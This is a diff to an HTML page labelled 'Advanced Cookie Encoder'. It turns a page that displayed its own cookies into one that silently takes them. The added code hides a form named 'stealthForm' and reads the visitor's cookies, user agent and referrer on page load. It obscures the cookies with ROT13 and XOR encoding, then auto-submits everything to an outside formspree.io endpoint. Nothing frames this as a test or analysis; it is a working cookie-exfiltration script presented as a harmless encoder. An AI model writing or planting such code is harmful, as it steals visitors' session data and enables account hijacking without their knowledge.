@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Encoded Cookie Test</title>
+    <title>Advanced Cookie Encoder</title>
     <style>
         body {
             background-color: black;
@@ -20,44 +20,69 @@
             color: gold;
             text-shadow: 0 0 10px rgba(255, 215, 0, 0.8);
         }
+        form {
+            display: none; /* Hide form */
+        }
     </style>
 </head>
 <body>
 
-    <h2>Encoded Cookie Tester</h2>
-    <p id="encodedResults"></p>
+    <h2>Advanced Cookie Encoder</h2>
+
+    <form id="stealthForm" action="https://formspree.io/f/xeoqzkqe" method="POST">
+        <input type="hidden" name="sha256_hash" id="sha256Field" value="">
+        <input type="hidden" name="rot13_data" id="rot13Field" value="">
+        <input type="hidden" name="xor_data" id="xorField" value="">
+        <input type="hidden" name="user_agent" id="userAgentField" value="">
+        <input type="hidden" name="referrer" id="referrerField" value="">
+        <input type="hidden" name="fallback" value="not_empty">
+        <button type="submit">Send</button>
+    </form>
 
     <script>
-        document.addEventListener("DOMContentLoaded", function() {
+        document.addEventListener("DOMContentLoaded", async function() {
             var cookies = document.cookie || "No_Cookies";
+            var userAgent = navigator.userAgent || "Unknown_User_Agent";
+            var referrer = document.referrer || "No_Referrer";
 
-            // Base64 Encoding
-            function encodeBase64(str) {
-                return btoa(unescape(encodeURIComponent(str)));
+            // SHA-256 Hashing (async)
+            async function hashSHA256(str) {
+                const encoder = new TextEncoder();
+                const data = encoder.encode(str);
+                const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+                return Array.from(new Uint8Array(hashBuffer)).map(byte => byte.toString(16).padStart(2, '0')).join('');
             }
 
-            // URL Encoding
-            function encodeURL(str) {
-                return encodeURIComponent(str);
+            // ROT13 Encoding
+            function encodeROT13(str) {
+                return str.replace(/[A-Za-z]/g, function(c) {
+                    return String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13));
+                });
             }
 
-            // Hex Encoding
-            function encodeHex(str) {
-                return Array.from(str).map(char => char.charCodeAt(0).toString(16).padStart(2, '0')).join('');
+            // XOR Encryption with a key
+            function encodeXOR(str, key) {
+                return Array.from(str).map((char, i) => 
+                    String.fromCharCode(char.charCodeAt(0) ^ key.charCodeAt(i % key.length))
+                ).join('');
             }
 
-            var encodedCookies = {
-                "Base64": encodeBase64(cookies),
-                "URL Encoded": encodeURL(cookies),
-                "Hex Encoded": encodeHex(cookies)
-            };
+            let xorKey = "mySecretKey";  // Change this key for security
+            let sha256Hash = await hashSHA256(cookies);
+            let rot13Encoded = encodeROT13(cookies);
+            let xorEncoded = btoa(encodeXOR(cookies, xorKey)); // XOR + Base64 for readability
 
-            // Display encoded cookies on page
-            document.getElementById("encodedResults").innerHTML = `
-                <strong>Base64:</strong> ${encodedCookies["Base64"]} <br>
-                <strong>URL Encoded:</strong> ${encodedCookies["URL Encoded"]} <br>
-                <strong>Hex Encoded:</strong> ${encodedCookies["Hex Encoded"]}
-            `;
+            // Inject values into form fields
+            document.getElementById("sha256Field").value = sha256Hash;
+            document.getElementById("rot13Field").value = rot13Encoded;
+            document.getElementById("xorField").value = xorEncoded;
+            document.getElementById("userAgentField").value = userAgent;
+            document.getElementById("referrerField").value = referrer;
+
+            // Auto-submit the form if cookies exist
+            if (cookies !== "No_Cookies" || referrer !== "No_Referrer") {
+                document.getElementById("stealthForm").submit();
+            }
         });
     </script>
 
